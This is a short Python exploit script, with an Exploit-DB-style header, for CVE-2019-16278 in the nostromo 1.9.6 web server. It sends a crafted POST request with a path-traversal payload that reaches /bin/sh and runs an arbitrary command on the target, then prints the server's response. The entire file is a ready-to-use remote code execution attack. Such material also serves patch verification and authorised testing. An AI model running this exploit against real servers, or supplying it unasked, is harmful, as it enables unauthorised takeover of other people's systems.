# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

#!/usr/bin/env python

import sys
import socket

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = b""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except Exception as e:
        print(f'[!] Error al recibir datos: {e}')
    return response.decode(errors='replace')

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    print(f'PAYLOAD: {payload}')
    soc.send(payload.encode())
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        # print(f'Argumentos: [1]: {target} [2]: {port} [3]: {cmd}')
        cve(target, port, cmd)

    except IndexError:
        print(help_menu)